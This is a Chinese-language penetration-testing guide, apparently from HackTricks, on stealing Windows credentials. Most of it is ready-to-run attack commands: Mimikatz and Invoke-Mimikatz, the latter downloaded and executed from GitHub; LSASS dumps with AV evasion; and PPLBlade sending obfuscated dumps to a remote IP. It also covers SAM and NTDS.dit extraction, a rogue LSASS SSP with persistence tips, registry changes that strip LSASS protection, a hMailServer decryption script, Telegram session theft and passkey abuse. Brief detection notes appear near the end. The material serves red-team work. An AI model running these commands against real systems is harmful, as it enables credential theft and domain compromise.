# 窃取 Windows 凭据

{{#include ../../banners/hacktricks-training.md}}

## 凭据 Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**了解 Mimikatz 还能做什么，请参阅** [**此页面**](credentials-mimikatz.md)**。**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**在此了解一些可能的凭据保护措施。**](credentials-protections.md) **这些保护措施可能会阻止 Mimikatz 提取某些凭据。**

## Credentials with Meterpreter

使用我创建的 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)，在受害者的系统中**搜索密码和哈希**。

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## 绕过 AV

### Procdump + Mimikatz

由于 **Procdump 来自** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**，它是 Microsoft 的合法工具**，因此不会被 Defender 检测到。\
你可以使用此工具**转储 lsass 进程**、**下载 dump**，并从 dump 中在**本地提取凭据**。

你也可以使用 [SharpDump](https://github.com/GhostPack/SharpDump)。

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

此过程通过 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成：`./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**：某些 **AV** 可能会将使用 **procdump.exe dump lsass.exe** 检测为**恶意行为**，这是因为它们会检测字符串 **"procdump.exe" 和 "lsass.exe"**。因此，将 lsass.exe 的 **PID** 作为参数传给 procdump，**而不是**使用 **lsass.exe 这个名称**，会更加**隐蔽**。

### 使用 **comsvcs.dll** dump lsass

在 `C:\Windows\System32` 中有一个名为 **comsvcs.dll** 的 DLL，负责在进程崩溃时 **dump 进程内存**。此 DLL 包含一个名为 **`MiniDumpW`** 的**函数**，设计为通过 `rundll32.exe` 调用。\
前两个参数无关紧要，但第三个参数分为三个部分。要 dump 的进程 ID 是第一部分，dump 文件位置是第二部分，第三部分必须是 **full** 这个单词。没有其他选项。\
解析这三个部分后，DLL 会创建 dump 文件，并将指定进程的内存写入该文件。\
可以使用 **comsvcs.dll** dump lsass 进程，从而无需上传并运行 procdump。此方法的详细说明见 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords)。<sup>[[9]](#references)</sup>

执行时使用以下命令：

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**你可以使用** [**lssasy**](https://github.com/Hackndo/lsassy)** 自动化此过程。**

### **使用 Task Manager 转储 lsass**

1. 右键单击任务栏，然后单击 Task Manager
2. 单击 More details
3. 在 Processes 选项卡中找到“Local Security Authority Process”进程
4. 右键单击“Local Security Authority Process”进程，然后单击“Create dump file”。

### 使用 procdump 转储 lsass

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是 Microsoft 签名的二进制文件，属于 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件。

已有的完整系统崩溃转储，或存放在可访问用户文件夹中的压缩副本，可能会保留可供离线分析的凭据材料。`MEMORY.DMP` 和 `MEMORY.7z` 之类的文件名只能作为检查线索：请验证其来源和访问权限，不要假定其中包含可用或最新的凭据。

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## 从 VM 快照离线提取凭据

可读的 VM 备份可能包含已保存的**客户机内存映像**，即使无法访问正在运行的客户机或 LSASS。对于 VMware，请识别 `.vmsn` 快照元数据，以及存在时与之配套的 `.vmem`；不要将它们与 `.vmdk` 磁盘映像混淆。`VMkatz` 可解析快照或 VM 目录输入，并从客户机内存中恢复 [Windows 登录会话凭据](credentials-mimikatz.md)，例如 hashes 和 tickets。它还可以检查虚拟磁盘中的 SAM/LSA 材料。访问备份文件是前提，无需对正在运行的 VM 拥有调试权限。<sup>[[17]](#references)[[18]](#references)</sup>

```bash
vmkatz snapshot.vmsn
vmkatz --disk disk.vmdk snapshot.vmsn   # Resolve paged-out data when a disk is available
vmkatz /path/to/vm-directory/          # Discover supported VM files
```

Checkpoint 中的示例从独立 VM 快照中恢复了一个**本地** Administrator NT hash。只有在另外确认密码复用后，它才成功通过域身份验证；备份中的本地 hash 本身并不等同于域凭据。在内存受限的主机上，VMkatz 可能会逐步扫描并释放页面，但将快照复制到更大内存的分析主机上仍可能更合适。<sup>[[17]](#references)[[18]](#references)</sup>

## 使用 PPLBlade 转储 lsass

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 是一款 Protected Process Dumper Tool，支持对内存转储进行混淆，并将其传输到远程工作站，而无需将其写入磁盘。

**主要功能**：

1. 绕过 PPL 保护
2. 混淆内存转储文件，以规避 Defender 基于签名的检测机制
3. 使用 RAW 和 SMB 上传方式上传内存转储，而无需将其写入磁盘（fileless dump）

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – 基于 SSP、无需 MiniDumpWriteDump 的 LSASS dump

Ink Dragon 使用一种名为 **LalsDumper** 的三阶段 dumper，它从不调用 `MiniDumpWriteDump`，因此针对该 API 的 EDR hooks 不会触发：<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – 在 `fdp.dll` 中查找由 32 个小写 `d` 字符组成的占位符，将其替换为 `rtu.txt` 的绝对路径，把修补后的 DLL 保存为 `nfdp.dll`，并调用 `AddSecurityPackageA("nfdp","fdp")`。这会强制 **LSASS** 将恶意 DLL 加载为新的 Security Support Provider (SSP)。
2. **LSASS 内部的 Stage 2** – LSASS 加载 `nfdp.dll` 时，该 DLL 会读取 `rtu.txt`，将每个字节与 `0x20` 进行 XOR 运算，然后把解码后的 blob 映射到内存中，再转移执行权。
3. **Stage 3 dumper** – 映射后的 payload 使用从哈希 API 名称解析出的 **direct syscalls**，重新实现 MiniDump 逻辑（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）。名为 `Tom` 的专用导出函数会打开 `%TEMP%\<pid>.ddt`，将压缩后的 LSASS dump 写入文件，然后关闭句柄，以便稍后进行 exfiltration。

操作说明：

* 将 `lals.exe`、`fdp.dll`、`nfdp.dll` 和 `rtu.txt` 放在同一目录中。Stage 1 会用 `rtu.txt` 的绝对路径替换硬编码的占位符，因此将它们分开放置会破坏整个链条。
* 注册时会将 `nfdp` 附加到 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`。你也可以自行写入该值，使 LSASS 在每次启动时重新加载 SSP。
* `%TEMP%\*.ddt` 文件是压缩后的 dump。在本地解压，然后将其交给 Mimikatz/Volatility 提取凭据。
* 运行 `lals.exe` 需要 admin/SeTcb 权限，这样 `AddSecurityPackageA` 才能成功；调用返回后，LSASS 会透明地加载 rogue SSP 并执行 Stage 2。
* 从磁盘删除 DLL 不会使其从 LSASS 中卸载。你可以删除注册表项并重启 LSASS（重启系统），也可以保留该项以实现长期持久化。

## CrackMapExec

### Dump SAM hashes

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### 从目标 DC Dump NTDS.dit

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump 目标 DC 的 NTDS.dit 密码历史记录

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### 显示每个 NTDS.dit 账户的 pwdLastSet 属性

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Stealing SAM & SYSTEM

这些文件应该**位于**_C:\windows\system32\config\SAM_ 和 _C:\windows\system32\config\SYSTEM_。但是，**不能直接以常规方式复制它们**，因为它们受保护。

### From Registry

从注册表获取副本是窃取这些文件最简单的方法：

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**下载**这些文件到你的 Kali 机器上，并使用以下命令**提取哈希**：

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### 卷影复制

你可以使用此服务复制受保护的文件。你需要具有 Administrator 权限。

#### 使用 vssadmin

vssadmin 二进制文件仅在 Windows Server 版本中提供。

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

但你也可以通过 **Powershell** 执行相同操作。下面是**复制 SAM 文件**的示例（使用的驱动器是“C:”，文件保存到 C:\users\Public），但你可以用这种方法复制任何受保护的文件：

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

书中的代码：[https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

最后，你还可以使用 [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) 来复制 SAM、SYSTEM 和 ntds.dit。

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory 凭据 - NTDS.dit**

**NTDS.dit** 被称为 **Active Directory** 的核心，存储着有关用户对象、组及其成员关系的重要数据。域用户的 **password hashes** 就存储在此文件中。该文件是 **Extensible Storage Engine (ESE)** 数据库，位于 **_%SystemRoom%/NTDS/ntds.dit_**。

该数据库包含三个主要表：

- **Data Table**：负责存储用户和组等对象的详细信息。
- **Link Table**：跟踪组成员关系等关联。
- **SD Table**：保存每个对象的 **安全描述符**，以确保已存储对象的安全性和访问控制。

Christoffer Andersson 关于数据库层的研究详细记录了这些表及其因版本而异的行为。<sup>[[8]](#references)</sup>

Windows 使用 _Ntdsa.dll_ 与该文件交互，而该文件由 _lsass.exe_ 使用。因此，**部分** **NTDS.dit** 文件可能位于 **`lsass`** 内存中（你或许能找到最近访问的数据，因为系统可能使用 **cache** 来提升性能）。

#### 解密 NTDS.dit 中的 hash

hash 会被加密三次：

1. 使用 **BOOTKEY** 和 **RC4** 解密 Password Encryption Key (**PEK**)。
2. 使用 **PEK** 和 **RC4** 解密 **hash**。
3. 使用 **DES** 解密 **hash**。

**PEK** 在每个域控制器上具有**相同的值**，但它会使用该域控制器 **SYSTEM** hive 中特有的 **BOOTKEY** 加密后存储在 **NTDS.dit** 中。因此，提取凭据需要同时获取 **NTDS.dit** 和 **SYSTEM**（`C:\Windows\System32\config\SYSTEM`）。

另一种独立的[内核句柄表重定向技术](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md)可以在不使用 VSS 的情况下复制已打开的 NTDS 文件对象，但需要在域控制器上具备任意内核读写原语。<sup>[[16]](#references)</sup>

### 使用 Ntdsutil 复制 NTDS.dit

从 Windows Server 2008 起可用。

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

你也可以使用 [**volume shadow copy**](#stealing-sam-and-system) 技巧来复制 **ntds.dit** 文件。请记住，你还需要一份 **SYSTEM 文件**（同样可以[**从注册表中导出，或使用 volume shadow copy**](#stealing-sam-and-system) 技巧）。

### **从 NTDS.dit 中提取 hashes**

获取 **NTDS.dit** 和 **SYSTEM** 文件后，你可以使用 _secretsdump.py_ 等工具来**提取 hashes**：

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

你也可以使用有效的域管理员用户**自动提取它们**：

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

对于**较大的 NTDS.dit 文件**，建议使用 [gosecretsdump](https://github.com/c-sto/gosecretsdump) 提取。

最后，你也可以使用 **metasploit module**：_post/windows/gather/credentials/domain_hashdump_，或使用 **mimikatz** `lsadump::lsa /inject`

### **将 NTDS.dit 中的域对象提取到 SQLite 数据库**

可以使用 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) 将 NTDS 对象提取到 SQLite 数据库中。提取的不仅是 secrets，还包括完整对象及其属性，以便在获取原始 NTDS.dit 文件后进一步提取信息。

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` hive 是可选的，但可用于解密 secrets（NT 和 LM hashes、补充凭据，例如明文密码、Kerberos 或信任密钥、NT 和 LM 密码历史记录）。此外，还会提取以下信息：用户和计算机账户及其 hashes、UAC flags、上次登录和密码更改的时间戳、账户描述、名称、UPN、SPN、组及递归成员关系、组织单位树及成员关系、受信任域及其信任类型、方向和属性……

## Lazagne

从[这里](https://github.com/AlessandroZ/LaZagne/releases)下载二进制文件。你可以使用此二进制文件从多种软件中提取凭据。

```
lazagne.exe all
```

## 从 SAM 和 LSASS 提取凭据的其他工具

### Windows credentials Editor (WCE)

此工具可用于从内存中提取凭据。下载地址：[http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

从 SAM 文件中提取凭据

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

从 SAM 文件中提取凭据

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

从这里下载：[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7)，然后只需**执行它**，即可提取密码。

## 挖掘空闲 RDP 会话并削弱安全控制

Ink Dragon 的 FinalDraft RAT 包含一个名为 `DumpRDPHistory` 的 tasker，其技术对任何 red-teamer 都很实用：<sup>[[3]](#references)</sup>

### 类似 DumpRDPHistory 的遥测收集

* **出站 RDP 目标** – 解析 `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` 下的每个用户 hive。每个子项都存储服务器名称、`UsernameHint` 和最后写入时间戳。你可以使用 PowerShell 复现 FinalDraft 的逻辑：

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **入站 RDP 证据** – 查询 `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` 日志中的事件 ID **21**（成功登录）和 **25**（断开连接），以确定谁管理了这台主机：

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

一旦确认哪位 Domain Admin 会定期连接，就在其**断开连接**的会话仍然存在时转储 LSASS（使用 LalsDumper/Mimikatz）。CredSSP + NTLM fallback 会将其 verifier 和 tokens 留在 LSASS 中，随后可通过 SMB/WinRM 重放这些内容，以获取 `NTDS.dit` 或在域控制器上部署持久化。

### FinalDraft 针对的注册表降级

该 implant 还会篡改多个注册表项，让凭据窃取更容易：<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` 会为入站 RDP 禁用 Restricted Admin；它**不会**通过该模式启用 pass-the-hash。将值设为 `0` 会允许目标端使用 Restricted Admin，但客户端必须请求 `/RestrictedAdmin`，或使用要求启用 Restricted Admin 的策略。<sup>[[14]](#references)</sup> 单凭哈希无法获得远程管理员权限；参见 [RDP 身份验证前提条件](../../network-services-pentesting/pentesting-rdp.md)。<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` 会禁用 UAC 令牌筛选，使本地管理员通过网络获得不受限制的令牌。
* `DSRMAdminLogonBehavior=2` 允许 DSRM 管理员在 DC 联机时登录，为攻击者提供另一个内置的高权限账户。
* `RunAsPPL=0` 会移除 LSASS PPL 保护，使 LalsDumper 等转储工具能够轻易访问内存。

## hMailServer 配置凭据（入侵后）

根据安装布局，检查准确的配置文件 `C:\Program Files\hMailServer\Bin\hMailServer.ini`、`C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` 和 `C:\ProgramData\hMailServer\hMailServer.ini`。如果 `[Security] AdministratorPassword=` 的值可读且非空，它就是 hMailServer 管理员密码哈希；这并不能证明它是 Windows Administrator 密码。如果恢复了该凭据，只有在独立验证密码复用情况和登录权限后，才能尝试转向 Windows 账户。

对于使用 SQL CE 数据库的安装，INI 文件中单独的 `[Database] Password=` 值用于保护数据库。在旧版安装中，该值使用静态密钥 `THIS_KEY_IS_NOT_SECRET` 进行 Blowfish 加密，并交换 4 字节字的字节序。使用 INI 文件中的十六进制字符串运行以下 Python 代码片段：<sup>[[2]](#references)</sup>

首先确认当前账户可以读取 INI 文件和对应的 SQL CE `.sdf` 数据库。INI 密码保护的是数据库，与其中存储的邮箱账户哈希是分开的。检查或升级正在使用的数据库时，只能操作其**副本**，切勿操作正在使用的文件。

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

使用明文密码复制 SQL CE 数据库以避免文件锁定，加载 32 位 provider，并在需要时升级，然后查询哈希：

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

`accountpassword` 列使用 hMailServer 哈希格式（hashcat 模式 `1421`）。只有当被破解的邮箱密码也被本地/域帐户重复使用，且该帐户拥有所需的远程登录权限时，它才能成为 Windows 用户 pivot。

## LSA Logon Callback Interception (LsaApLogonUserEx2)

一些工具通过拦截 LSA 登录回调 `LsaApLogonUserEx2` 来捕获**明文登录密码**。其思路是 hook 或包装身份验证包回调，在登录期间（哈希前）捕获凭据，然后将其写入磁盘或返回给操作者。这通常通过一个辅助程序实现，该程序注入 LSA 或向其注册，然后记录每次成功的交互式/网络登录事件，包括用户名、域和密码。<sup>[[1]](#references)</sup>

操作注意事项：
- 需要本地管理员/SYSTEM 权限，才能在身份验证路径中加载辅助程序。
- 只有发生登录时才会捕获凭据（具体取决于 hook，可能是交互式、RDP、服务或网络登录）。

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) 会将已保存的连接信息存储在每用户的 `sqlstudio.bin` 文件中。专用的转储工具可以解析该文件并恢复已保存的 SQL 凭据。在只能返回命令输出的 shell 中，通常会将文件编码为 Base64 并打印到 stdout，以便外传。<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

在操作端重新构建该文件，并在本地运行 dumper 以恢复凭据：

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## 通过 Chrome DevTools Protocol 窃取浏览器会话和 cookie

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## 窃取 Telegram Desktop `tdata` 会话

Telegram Desktop 将授权信息和账户状态保存在 **`tdata`** 目录中。只要授权仍然有效，就可以使用兼容的工具加载复制的会话，无需账户密码即可完成身份验证；如果启用了本地数据加密，stealer 还需要该账户的密码。随后，经过身份验证的会话可暴露身份数据、对话和成员资格元数据、消息以及可下载的媒体文件。<sup>[[10]](#references)</sup>

### 发现和获取

搜索已安装和便携式版本的目录布局；Microsoft Store 的包名称各不相同，因此请枚举包含 `TelegramMessenge` 的包目录，并检查其 `LocalCache\Roaming` 子目录。<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

如果普通读取失败，且进程令牌**已包含并启用** `SeBackupPrivilege`，则可将支持备份的访问方式作为后备方案；它不会获取该权限，也不会提升进程权限。具备所需令牌权限时，`CreateFileW` 配合 `FILE_FLAG_BACKUP_SEMANTICS` 可请求备份/还原语义并绕过文件安全检查，但仅设置该标志无法突破不兼容的共享锁。<sup>[[10]](#references)[[11]](#references)</sup>

对于正在使用且被锁定的文件，可创建/读取 **Volume Shadow Copy**；对于受 ACL 阻止的文件，`robocopy /B` 会使用备份模式并绕过文件和目录 ACL。<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

具有带宽意识的 implant 可能会先只提交文件路径清单，收到快照标识符以及 C2 已存储的路径后，再仅上传缺失的文件。因此，在递归枚举 `tdata` 后进行的小规模增量传输，仍可能代表会话窃取成功。<sup>[[10]](#references)</sup>

### 检测与遏制

将非 Telegram 进程对 `tdata` 的递归访问，与 `SeBackupPrivilege` 启用、使用备份语义打开文件、VSS 活动，或使用 `/B` 的子进程 `robocopy.exe` 相关联进行分析。还应搜寻快速枚举 `%APPDATA%` 和 `%LOCALAPPDATA%\Packages`，随后同一进程建立出站连接的情况。遭到入侵后，使用 **Settings → Devices**（或 **Privacy & Security → Active Sessions**）终止不认识的会话；仅启用两步验证并不会撤销已被窃取的授权。<sup>[[10]](#references)[[13]](#references)</sup>

## 从 Windows 上的 Chrome 窃取 Passkeys / WebAuthn 凭据

如果在使用 **Chrome + Google Password Manager 同步 Passkeys** 的 Windows 主机上，以**受害者用户**身份获得代码执行权限，那么即使**没有管理员/SYSTEM 权限**，Passkeys 仍是值得关注的 post-exploitation 目标。<sup>[[4]](#references)</sup>

### 有价值的本地痕迹

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** 存储以 protobuf 编码的 **`WebauthnCredentialSpecifics`** 记录。同一用户的进程可以枚举同步通行密钥的 **RP ID**、**用户名**、**凭据 ID** 和加密的私钥材料。<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** 存储本地设备注册状态，例如 **`wrapped_identity_private_key`**，以及用于恢复同步凭据的封装密钥。<sup>[[4]](#references)</sup>

快速分诊：

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### 绑定 TPM 的密钥 blob 仍可被滥用为本地签名预言机

如果浏览器将 TPM 支持的身份密钥导出为 **`NCRYPT_OPAQUE_KEY_BLOB`**，并将该 blob 存储在用户可访问的状态中，恶意软件就**不需要**提取原始私钥。它只需在**同一台机器**上重新导入该 blob，并请求本地 TPM 对攻击者控制的数据进行签名：<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

这意味着，**hardware binding 可以防止凭据导出到设备外部，但无法阻止攻击者在已被入侵的终端上以同一用户身份使用凭据**。

### 实际滥用路径

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - 从 Chrome 的 LevelDB 中枚举 `WebauthnCredentialSpecifics`。
   - 发起 passkey 登录并获取新的 WebAuthn challenge。
   - 在受害者的 TPM 上使用窃取的 `wrapped_identity_private_key` blob，对 cloud-authenticator 请求绑定进行签名。
   - 将返回的 assertion 中继给 relying party。
   - 如果 RP 接受 `userVerification=preferred`，或未能拒绝 **`UV=0`** 的 assertion，这种攻击尤其有用。
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - 通过删除 `passkey_enclave_state` 或发送有效签名的 `device/forget` 操作，强制重新 onboarding。
   - 如果 onboarding 后设备处于 **`uv_key_pending`** 状态，则注册攻击者控制的 UV 公钥。
   - 如果 provider 不验证新 UV key 的 attestation / secure-hardware 来源，则后续由攻击者的 key 生成的签名会被视为 **`UV=1`**。
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
   - 强制执行 recovery 或 rejoin，使 Chrome 获取同步 passkey 的 master secret。
   - 监控 `passkey_enclave_state` 的重建或修改，然后在明文 **security domain secret (SDS)** 驻留于 Chrome 内存时转储其内存。
   - 使用恢复的 SDS 解密每条 `WebauthnCredentialSpecifics` 记录中的加密字段，并恢复可移植的 WebAuthn 私钥。

### DFIR / 检测思路

- 监控 `passkey_enclave_state` 的**删除/重建**。<sup>[[4]](#references)</sup>
- 对非浏览器进程异常访问 Chrome **`Sync Data\LevelDB`** 发出告警。
- 对 **Chrome 内存转储**或可疑的跨进程内存访问发出告警。
- 调查反复出现的 **Google Password Manager recovery PIN** 提示，或意外的重新 onboarding。
- 请注意，同步 passkey 的 WebAuthn **`signCount`** 往往没有参考价值，因为它可能保持不变，因此传统的克隆检测效果有限。

## References

- [1] [Unit 42 – 一项针对高价值行业、持续多年且未被发现的行动调查](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo：通过 SMTP 发送 Word VBA 宏钓鱼邮件 → hMailServer 凭据解密 → 利用 Veeam CVE-2023-27532 获取 SYSTEM 权限](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – 深入 Ink Dragon：揭示其中继网络与隐秘攻击行动的内部运作机制](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
